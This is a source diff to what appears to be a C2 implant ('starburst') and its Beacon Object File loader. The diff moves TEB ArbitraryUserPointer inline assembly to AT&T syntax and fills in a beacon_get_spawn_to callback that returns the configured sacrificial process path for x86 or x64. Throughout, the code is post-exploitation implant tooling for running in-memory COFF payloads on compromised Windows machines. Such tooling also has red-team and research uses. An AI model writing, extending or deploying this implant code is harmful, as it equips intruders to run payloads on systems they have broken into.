@@ -69,14 +69,14 @@ struct COFF_RELOCATION {
 // TEB.ArbitraryUserPointer helpers for passing instance to callbacks
 static inline auto declfn coff_set_inst( instance* p ) -> void {
 #ifdef _M_X64
-    __asm__ volatile ( "mov qword ptr gs:[0x28], %0" :: "r"(p) : "memory" );
+    __asm__ volatile ( "movq %0, %%gs:0x28" :: "r"(p) : "memory" );
 #endif
 }
 
 static inline auto declfn coff_get_inst() -> instance* {
 #ifdef _M_X64
     instance* p;
-    __asm__ volatile ( "mov %0, qword ptr gs:[0x28]" : "=r"(p) );
+    __asm__ volatile ( "movq %%gs:0x28, %0" : "=r"(p) );
     return p;
 #else
     return nullptr;
@@ -231,8 +231,13 @@ static BOOL __cdecl declfn beacon_is_admin() {
 }
 
 static DWORD __cdecl declfn beacon_get_spawn_to( BOOL x86, char* buf, int len ) {
-    (void)x86; (void)buf; (void)len;
-    return 0;
+    auto inst = coff_get_inst();
+    if ( !inst || !buf || len <= 0 ) return 0;
+    const char* src = x86 ? inst->spawnto.x86 : inst->spawnto.x64;
+    int i = 0;
+    while ( src[i] && i < len - 1 ) { buf[i] = src[i]; i++; }
+    buf[i] = '\0';
+    return static_cast<DWORD>( i );
 }
 
 static void __cdecl declfn beacon_cleanup_thread( void* ctx ) {
@@ -493,7 +498,7 @@ auto declfn starburst::cmd_execute_coff(
     // save old ArbitraryUserPointer, set instance for beacon callbacks
     void* old_aup = nullptr;
 #ifdef _M_X64
-    __asm__ volatile ( "mov %0, qword ptr gs:[0x28]" : "=r"(old_aup) );
+    __asm__ volatile ( "movq %%gs:0x28, %0" : "=r"(old_aup) );
 #endif
     coff_set_inst( &inst );
 
